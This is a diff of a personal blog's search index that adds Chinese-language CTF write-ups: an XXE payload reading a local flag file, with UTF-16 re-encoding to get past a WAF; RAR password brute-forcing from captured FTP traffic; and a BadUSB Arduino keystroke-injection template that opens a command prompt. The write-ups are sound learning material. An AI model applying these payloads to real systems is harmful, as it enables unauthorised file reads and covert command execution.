@@ -4,9 +4,65 @@
   
     
     <entry>
+      <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
+      <link href="/blog/2020/10/04/web1-dropbox/"/>
+      <url>/blog/2020/10/04/web1-dropbox/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> phar </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>被偷走的文件</title>
+      <link href="/blog/2020/10/03/bei-tou-zou-de-wen-jian/"/>
+      <url>/blog/2020/10/03/bei-tou-zou-de-wen-jian/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01-流量分析"><a href="#0x01-流量分析" class="headerlink" title="0x01 流量分析"></a>0x01 流量分析</h2><p>首先下载下来弹出来了个让输入密码的框框，然后取消后也能正常地解压，放在kali里面用wireshark打开，搜索关键词<code>flag</code>，发现有个ftp的流量，追踪一下发现是个flag.rar(其实不用追踪就能看得到)，然后过滤ftp的流量，将过滤器的选项换为<code>ftp-data</code>就只有一个流量，追踪，保留原始数据（开始为ASCII的那个地方），save as，保存为rar后缀名的文件，发现有密码，kali解不开。</p><h2 id="0x02-rar穷举解密"><a href="#0x02-rar穷举解密" class="headerlink" title="0x02 rar穷举解密"></a>0x02 rar穷举解密</h2><p>用软件ARCHPR破解密码，但是速度有一点点慢，从四位数字开始测，口令为5790，阿巴阿巴。输入密码得flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> misc文件隐写 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> misc </tag>
+            
+            <tag> 文件隐写 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>[CSAWQual 2019]Web_Unagi</title>
-      <link href="/blog/2020/09/28/2019-web-unagi/"/>
-      <url>/blog/2020/09/28/2019-web-unagi/</url>
+      <link href="/blog/2020/09/30/2019-web-unagi/"/>
+      <url>/blog/2020/09/30/2019-web-unagi/</url>
       
         <content type="html"><![CDATA[<h2 id="判断xxe"><a href="#判断xxe" class="headerlink" title="判断xxe"></a>判断xxe</h2><p>首先看下各个界面有什么信息，看到upload界面有一个upload的功能，可以上传新的用户。然后看到here的那个链接里面的内容是xml格式的，所以我们很容易就能联想得到使用xxe、xml外部实体注入。上传一个xml文件就好了</p><h2 id="上传xxe文件"><a href="#上传xxe文件" class="headerlink" title="上传xxe文件"></a>上传xxe文件</h2><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span><span class="token doctype">&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM "file:///flag" ></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>lice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>Alice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>alice@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span></code></pre><p>做成一个xml文件就行了，上传一下，有WAF，不知道过滤了啥。wp上说要换一下编码方式，用命令:</p><pre><code>iconv -f utf-8 -t utf-16 1.xml&gt;2.xml</code></pre><h2 id="得flag"><a href="#得flag" class="headerlink" title="得flag"></a>得flag</h2><p><del>上面的内容转utf16后还是不行，只能用他给出的</del></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span><span class="token doctype">&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM "file:///flag" ></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>bob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span> Bob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>bob@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>CSAW2019<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intro</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intro</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span></code></pre><p>我的锅，要用linux的vim（windows上好像也有，但是下面的命令还得在linux上面执行，索性就用linux的vim）编写代码然后再使用上面的编码命令才不会报错，然后就能直接上传得flag了。</p>]]></content>
       
@@ -32,8 +88,8 @@
     
     <entry>
       <title>badusb之Arduino语法</title>
-      <link href="/blog/2020/09/28/badusb-zhi-arduino-yu-fa/"/>
-      <url>/blog/2020/09/28/badusb-zhi-arduino-yu-fa/</url>
+      <link href="/blog/2020/09/29/badusb-zhi-arduino-yu-fa/"/>
+      <url>/blog/2020/09/29/badusb-zhi-arduino-yu-fa/</url>
       
         <content type="html"><![CDATA[<h1 id="BadUsb简单用法示例"><a href="#BadUsb简单用法示例" class="headerlink" title="BadUsb简单用法示例"></a>BadUsb简单用法示例</h1><h2 id="所需硬件"><a href="#所需硬件" class="headerlink" title="所需硬件"></a>所需硬件</h2><p>badusb 自行淘宝  驱动程序会自动安装，若未自动安装自行百度</p><h2 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h2><p>arduino-1.5.5-r2用于编辑代码并上传至badusb<br>badusb连接至电脑</p><pre><code>打开arduino-1.5.5-r2-&gt;打开工具菜单-&gt;板-&gt;Arduino Leonardo                                   打开工具菜单-&gt;端口-&gt;选择相应的com口   //这一步极为重要</code></pre><p>左上角第二个向右的箭头图标为上传按钮，编辑好代码后上传至优盘即可。</p><h2 id="语法示例"><a href="#语法示例" class="headerlink" title="语法示例:"></a>语法示例:</h2><pre><code>void setup() &#123;  // put your setup code here, to run once:Keyboard.begin();//开始键盘通讯delay(3000);//延时Keyboard.press(KEY_LEFT_GUI);//win键delay(50);Keyboard.press(&#39;r&#39;);//r键delay(50);Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;);delay(1000);Keyboard.println(&quot;cmd &quot;); //注意这里命令的最后多了一个空格 如果目标终端的输入法是中文的话这个空格非常关键delay(500);Keyboard.println(&quot;ping  211.140.13.188 -t &quot;); ; //注意最后有一个空格delay(1000);//延时Keyboard.press(KEY_LEFT_GUI);//win键delay(50);Keyboard.press(&#39;r&#39;);//r键delay(50);Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;);delay(1000);Keyboard.println(&quot;cmd &quot;); //注意最后有一个空格delay(500);Keyboard.println(&quot;start http://weibo.com/enderzhou &quot;); //注意最后有一个空格&#125;void loop() &#123;  // put your main code here, to run repeatedly:&#125;具体按键设置delay(5000);//延时毫秒Keyboard.begin();     //开始键盘通讯Keyboard.end();     //结束键盘通讯Keyboard.press();     //按下键盘按键     如果是非特殊按键如 数字、字母按键用单引号括起来Keyboard.release();     //释放键盘按键Keyboard.println(&quot;&quot;);     //输入字符串使用双引号括起来Mouse.begin();//鼠标事件开始Mouse.click();//鼠标单击Mouse.end();//鼠标事件结束Mouse.move();//鼠标移动(x,y)Mouse.press();//鼠标按下Mouse.release();//鼠标松开Mouse.isPressed();// KEY_LEFT_CTRLKEY_LEFT_SHIFTKEY_LEFT_ALTKEY_LEFT_GUI    //win键KEY_RIGHT_CTRLKEY_RIGHT_SHIFTKEY_RIGHT_ALTKEY_RIGHT_GUIKEY_UP_ARROWKEY_DOWN_ARROWKEY_LEFT_ARROWKEY_RIGHT_ARROWKEY_BACKSPACEKEY_TABKEY_RETURN//回车键KEY_ESCKEY_INSERTKEY_DELETEKEY_PAGE_UPKEY_PAGE_DOWNKEY_HOMEKEY_ENDKEY_CAPS_LOCKKEY_F1KEY_F2KEY_F3KEY_F4KEY_F5KEY_F6KEY_F7KEY_F8KEY_F9KEY_F10KEY_F11KEY_F12</code></pre>]]></content>
       
